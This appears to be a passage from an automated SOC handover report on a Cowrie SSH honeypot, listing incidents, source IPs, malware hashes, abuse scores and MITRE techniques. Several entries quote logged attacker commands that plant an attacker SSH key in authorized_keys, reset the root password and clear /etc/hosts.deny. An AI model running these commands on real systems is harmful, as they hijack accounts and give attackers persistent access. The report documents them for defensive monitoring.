- [ ] Submit `183.110.63[.]196` to AbuseIPDB if not already reported
- [ ] Block `183.110.63[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd0ba8ccc900

| Field | Detail |
|---|---|
| **Source IP** | `183.110.63[.]196` |
| **First Seen** | 2026-03-31 03:34 |
| **Last Seen** | 2026-03-31 03:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 03:34:28` | `cowrie.session.connect` |
| `2026-03-31 03:34:28` | `cowrie.client.version` |
| `2026-03-31 03:34:28` | `cowrie.client.kex` |
| `2026-03-31 03:34:28` | `cowrie.login.success` |
| `2026-03-31 03:34:29` | `cowrie.session.params` |
| `2026-03-31 03:34:29` | `cowrie.command.input` |
| `2026-03-31 03:34:29` | `cowrie.command.failed` |
| `2026-03-31 03:34:29` | `cowrie.log.closed` |
| `2026-03-31 03:34:29` | `cowrie.session.params` |
| `2026-03-31 03:34:29` | `cowrie.command.input` |
| `2026-03-31 03:34:29` | `cowrie.session.file_download` |
| `2026-03-31 03:34:29` | `cowrie.log.closed` |
| `2026-03-31 03:34:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.110.63[.]196` to AbuseIPDB if not already reported
- [ ] Block `183.110.63[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7780ead1f8cf

| Field | Detail |
|---|---|
| **Source IP** | `183.110.63[.]196` |
| **First Seen** | 2026-03-31 03:34 |
| **Last Seen** | 2026-03-31 03:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 03:34:31` | `cowrie.session.connect` |
| `2026-03-31 03:34:31` | `cowrie.client.version` |
| `2026-03-31 03:34:32` | `cowrie.client.kex` |
| `2026-03-31 03:34:32` | `cowrie.login.success` |
| `2026-03-31 03:34:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.110.63[.]196` to AbuseIPDB if not already reported
- [ ] Block `183.110.63[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42099c1f8788

| Field | Detail |
|---|---|
| **Source IP** | `183.110.63[.]196` |
| **First Seen** | 2026-03-31 03:37 |
| **Last Seen** | 2026-03-31 03:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 03:37:50` | `cowrie.session.connect` |
| `2026-03-31 03:37:50` | `cowrie.client.version` |
| `2026-03-31 03:37:50` | `cowrie.client.kex` |
| `2026-03-31 03:37:50` | `cowrie.login.success` |
| `2026-03-31 03:37:51` | `cowrie.session.params` |
| `2026-03-31 03:37:51` | `cowrie.command.input` |
| `2026-03-31 03:37:51` | `cowrie.command.failed` |
| `2026-03-31 03:37:51` | `cowrie.log.closed` |
| `2026-03-31 03:37:51` | `cowrie.session.params` |
| `2026-03-31 03:37:51` | `cowrie.command.input` |
| `2026-03-31 03:37:51` | `cowrie.session.file_download` |
| `2026-03-31 03:37:51` | `cowrie.log.closed` |
| `2026-03-31 03:37:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.110.63[.]196` to AbuseIPDB if not already reported
- [ ] Block `183.110.63[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b181f7dc197

| Field | Detail |
|---|---|
| **Source IP** | `183.110.63[.]196` |
| **First Seen** | 2026-03-31 03:37 |
| **Last Seen** | 2026-03-31 03:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 03:37:53` | `cowrie.session.connect` |
| `2026-03-31 03:37:53` | `cowrie.client.version` |
| `2026-03-31 03:37:53` | `cowrie.client.kex` |
| `2026-03-31 03:37:54` | `cowrie.login.success` |
| `2026-03-31 03:37:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.110.63[.]196` to AbuseIPDB if not already reported
- [ ] Block `183.110.63[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91da5b6b4de1

| Field | Detail |
|---|---|
| **Source IP** | `183.110.63[.]196` |
| **First Seen** | 2026-03-31 03:41 |
| **Last Seen** | 2026-03-31 03:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 03:41:20` | `cowrie.session.connect` |
| `2026-03-31 03:41:20` | `cowrie.client.version` |
| `2026-03-31 03:41:20` | `cowrie.client.kex` |
| `2026-03-31 03:41:20` | `cowrie.login.success` |
| `2026-03-31 03:41:21` | `cowrie.session.params` |
| `2026-03-31 03:41:21` | `cowrie.command.input` |
| `2026-03-31 03:41:21` | `cowrie.command.failed` |
| `2026-03-31 03:41:21` | `cowrie.log.closed` |
| `2026-03-31 03:41:21` | `cowrie.session.params` |
| `2026-03-31 03:41:21` | `cowrie.command.input` |
| `2026-03-31 03:41:21` | `cowrie.session.file_download` |
| `2026-03-31 03:41:21` | `cowrie.log.closed` |
| `2026-03-31 03:41:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.110.63[.]196` to AbuseIPDB if not already reported
- [ ] Block `183.110.63[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-329a43f3b13e

| Field | Detail |
|---|---|
| **Source IP** | `183.110.63[.]196` |
| **First Seen** | 2026-03-31 03:41 |
| **Last Seen** | 2026-03-31 03:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 03:41:23` | `cowrie.session.connect` |
| `2026-03-31 03:41:23` | `cowrie.client.version` |
| `2026-03-31 03:41:24` | `cowrie.client.kex` |
| `2026-03-31 03:41:24` | `cowrie.login.success` |
| `2026-03-31 03:41:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.110.63[.]196` to AbuseIPDB if not already reported
- [ ] Block `183.110.63[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6f8264752c2

| Field | Detail |
|---|---|
| **Source IP** | `120.48.147[.]111` |
| **First Seen** | 2026-03-31 05:34 |
| **Last Seen** | 2026-03-31 05:35 |
| **Session Duration** | 50s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cat /proc/cpuinfo | grep name | wc -l, echo "root:6VH26tAxPNM1"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;, cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'` |
| **Download Attempts** | 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 05:34:57` | `cowrie.session.connect` |
| `2026-03-31 05:34:57` | `cowrie.client.version` |
| `2026-03-31 05:34:57` | `cowrie.client.kex` |
| `2026-03-31 05:35:03` | `cowrie.login.success` |
| `2026-03-31 05:35:04` | `cowrie.session.params` |
| `2026-03-31 05:35:04` | `cowrie.command.input` |
| `2026-03-31 05:35:04` | `cowrie.command.failed` |
| `2026-03-31 05:35:04` | `cowrie.log.closed` |
| `2026-03-31 05:35:24` | `cowrie.session.params` |
| `2026-03-31 05:35:24` | `cowrie.command.input` |
| `2026-03-31 05:35:24` | `cowrie.log.closed` |
| `2026-03-31 05:35:25` | `cowrie.session.params` |
| `2026-03-31 05:35:25` | `cowrie.command.input` |
| `2026-03-31 05:35:26` | `cowrie.log.closed` |
| `2026-03-31 05:35:27` | `cowrie.session.params` |
| `2026-03-31 05:35:27` | `cowrie.command.input` |
| `2026-03-31 05:35:27` | `cowrie.session.file_download` |
| `2026-03-31 05:35:27` | `cowrie.log.closed` |
| `2026-03-31 05:35:28` | `cowrie.session.params` |
| `2026-03-31 05:35:28` | `cowrie.command.input` |
| `2026-03-31 05:35:28` | `cowrie.log.closed` |
| `2026-03-31 05:35:29` | `cowrie.session.params` |
| `2026-03-31 05:35:29` | `cowrie.command.input` |
| `2026-03-31 05:35:29` | `cowrie.log.closed` |
| `2026-03-31 05:35:31` | `cowrie.session.params` |
| `2026-03-31 05:35:31` | `cowrie.command.input` |
| `2026-03-31 05:35:31` | `cowrie.command.input` |
| `2026-03-31 05:35:32` | `cowrie.log.closed` |
| `2026-03-31 05:35:33` | `cowrie.session.params` |
| `2026-03-31 05:35:33` | `cowrie.command.input` |
| `2026-03-31 05:35:34` | `cowrie.log.closed` |
| `2026-03-31 05:35:34` | `cowrie.session.params` |
| `2026-03-31 05:35:34` | `cowrie.command.input` |
| `2026-03-31 05:35:35` | `cowrie.log.closed` |
| `2026-03-31 05:35:35` | `cowrie.session.params` |
| `2026-03-31 05:35:35` | `cowrie.command.input` |
| `2026-03-31 05:35:36` | `cowrie.log.closed` |
| `2026-03-31 05:35:38` | `cowrie.session.params` |
| `2026-03-31 05:35:38` | `cowrie.command.input` |
| `2026-03-31 05:35:39` | `cowrie.log.closed` |
| `2026-03-31 05:35:41` | `cowrie.session.params` |
| `2026-03-31 05:35:41` | `cowrie.command.input` |
| `2026-03-31 05:35:41` | `cowrie.log.closed` |
| `2026-03-31 05:35:42` | `cowrie.session.params` |
| `2026-03-31 05:35:42` | `cowrie.command.input` |
| `2026-03-31 05:35:43` | `cowrie.log.closed` |
| `2026-03-31 05:35:43` | `cowrie.session.params` |
| `2026-03-31 05:35:43` | `cowrie.command.input` |
| `2026-03-31 05:35:43` | `cowrie.log.closed` |
| `2026-03-31 05:35:44` | `cowrie.session.params` |
| `2026-03-31 05:35:44` | `cowrie.command.input` |
| `2026-03-31 05:35:44` | `cowrie.log.closed` |
| `2026-03-31 05:35:45` | `cowrie.session.params` |
| `2026-03-31 05:35:45` | `cowrie.command.input` |
| `2026-03-31 05:35:45` | `cowrie.log.closed` |
| `2026-03-31 05:35:46` | `cowrie.session.params` |
| `2026-03-31 05:35:46` | `cowrie.command.input` |
| `2026-03-31 05:35:48` | `cowrie.log.closed` |
| `2026-03-31 05:35:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.147[.]111` to AbuseIPDB if not already reported
- [ ] Block `120.48.147[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99e8f0d1f255

| Field | Detail |
|---|---|
| **Source IP** | `47.237.73[.]171` |
| **First Seen** | 2026-03-31 05:40 |
| **Last Seen** | 2026-03-31 05:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 05:40:09` | `cowrie.session.connect` |
| `2026-03-31 05:40:09` | `cowrie.client.version` |
| `2026-03-31 05:40:09` | `cowrie.client.kex` |
| `2026-03-31 05:40:10` | `cowrie.login.success` |
| `2026-03-31 05:40:10` | `cowrie.session.params` |
| `2026-03-31 05:40:10` | `cowrie.command.input` |
| `2026-03-31 05:40:10` | `cowrie.command.failed` |
| `2026-03-31 05:40:10` | `cowrie.log.closed` |
| `2026-03-31 05:40:10` | `cowrie.session.params` |
| `2026-03-31 05:40:10` | `cowrie.command.input` |
| `2026-03-31 05:40:10` | `cowrie.session.file_download` |
| `2026-03-31 05:40:10` | `cowrie.log.closed` |
| `2026-03-31 05:40:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.237.73[.]171` to AbuseIPDB if not already reported
- [ ] Block `47.237.73[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d0fb7c3dc1d

| Field | Detail |
|---|---|
| **Source IP** | `47.237.73[.]171` |
| **First Seen** | 2026-03-31 05:40 |
| **Last Seen** | 2026-03-31 05:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 05:40:12` | `cowrie.session.connect` |
| `2026-03-31 05:40:12` | `cowrie.client.version` |
| `2026-03-31 05:40:12` | `cowrie.client.kex` |
| `2026-03-31 05:40:12` | `cowrie.login.success` |
| `2026-03-31 05:40:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.237.73[.]171` to AbuseIPDB if not already reported
- [ ] Block `47.237.73[.]171` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `183.110.63[.]196` | **10** | 2026-03-31 03:02 | 2026-03-31 03:41 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `18.116.101[.]220` | **6** | 2026-03-31 03:19 | 2026-03-31 03:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.36.122[.]183` | **4** | 2026-03-31 02:34 | 2026-03-31 02:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.67[.]70` | 1 | 2026-03-31 03:39 | 2026-03-31 03:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.217.215[.]67` | 1 | 2026-03-31 03:30 | 2026-03-31 03:30 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.70.8[.]143` | 1 | 2026-03-31 03:33 | 2026-03-31 03:33 | 12s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.168.71[.]109` | 1 | 2026-03-31 03:13 | 2026-03-31 03:13 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.92.167[.]50` | 1 | 2026-03-31 03:05 | 2026-03-31 03:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.160.140[.]138` | 1 | 2026-03-31 02:11 | 2026-03-31 02:11 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.158.166[.]73` | 1 | 2026-03-31 04:52 | 2026-03-31 04:52 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.196.73[.]184` | 1 | 2026-03-31 03:51 | 2026-03-31 03:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.147[.]111` | 1 | 2026-03-31 05:35 | 2026-03-31 05:35 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `122.114.12[.]133` | 1 | 2026-03-31 05:36 | 2026-03-31 05:37 | 49s | 0 | `T1592` | 🟢 LOW |
| `123.52.202[.]92` | 1 | 2026-03-31 04:12 | 2026-03-31 04:12 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `124.152.90[.]68` | 1 | 2026-03-31 03:50 | 2026-03-31 03:50 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `125.17.185[.]94` | 1 | 2026-03-31 04:49 | 2026-03-31 04:49 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `151.237.170[.]49` | 1 | 2026-03-31 02:16 | 2026-03-31 02:16 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `175.215.46[.]82` | 1 | 2026-03-31 02:25 | 2026-03-31 02:26 | 12s | 0 | `T1592` | 🟢 LOW |
| `176.36.174[.]177` | 1 | 2026-03-31 03:11 | 2026-03-31 03:11 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.11[.]192` | 1 | 2026-03-31 03:54 | 2026-03-31 03:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `192.228.199[.]225` | 1 | 2026-03-31 03:52 | 2026-03-31 03:53 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `197.251.193[.]6` | 1 | 2026-03-31 05:12 | 2026-03-31 05:12 | 3s | 0 | `T1592` | 🟢 LOW |
| `217.211.208[.]125` | 1 | 2026-03-31 02:14 | 2026-03-31 02:14 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.237.71[.]112` | 1 | 2026-03-31 04:30 | 2026-03-31 04:30 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `222.99.52[.]202` | 1 | 2026-03-31 05:12 | 2026-03-31 05:12 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `223.107.72[.]234` | 1 | 2026-03-31 04:33 | 2026-03-31 04:34 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `223.235.64[.]126` | 1 | 2026-03-31 02:35 | 2026-03-31 02:35 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `24.45.233[.]231` | 1 | 2026-03-31 05:09 | 2026-03-31 05:09 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.134.147[.]79` | 1 | 2026-03-31 02:17 | 2026-03-31 02:17 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `41.224.62[.]206` | 1 | 2026-03-31 04:13 | 2026-03-31 04:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.237.73[.]171` | 1 | 2026-03-31 05:40 | 2026-03-31 05:40 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.149[.]209` | 1 | 2026-03-31 04:54 | 2026-03-31 04:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `57.134.70[.]139` | 1 | 2026-03-31 05:32 | 2026-03-31 05:32 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `62.192.226[.]83` | 1 | 2026-03-31 05:33 | 2026-03-31 05:33 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `75.80.65[.]214` | 1 | 2026-03-31 04:14 | 2026-03-31 04:14 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `85.105.99[.]186` | 1 | 2026-03-31 04:10 | 2026-03-31 04:10 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `86.50.116[.]224` | 1 | 2026-03-31 02:51 | 2026-03-31 02:51 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `175.215.46[.]82` | KR | Korea Telecom | **100** ⚠️ | 0 |
| `86.50.116[.]224` | FI | Student Village Foundation of Turku | **100** ⚠️ | 4 |
| `183.171.11[.]192` | MY | Celcom Axiata Berhad | **100** ⚠️ | 12 |
| `41.224.62[.]206` | TN | ATI - Agence Tunisienne Internet | **100** ⚠️ | 50 |
| `124.152.90[.]68` | CN | China Unicom Gansu province network | **100** ⚠️ | 42 |
| `117.158.166[.]73` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `192.228.199[.]225` | MY | TT DOTCOM SDN BHD | **100** ⚠️ | 4 |
| `75.80.65[.]214` | US | Charter Communications Inc | **100** ⚠️ | 42 |
| `112.92.167[.]50` | CN | China Unicom Guangdong province network | **100** ⚠️ | 29 |
| `85.105.99[.]186` | TR | Turk Telekomunikasyon Anonim Sirketi | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 71 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 37 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 23 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 12 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 12 |

---

## 🔕 False Positive Summary (7 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 84 cases |
| Tool 34  | Credential Extractor        | ✅ 60 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 44 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 7 filtered (8.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 38 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

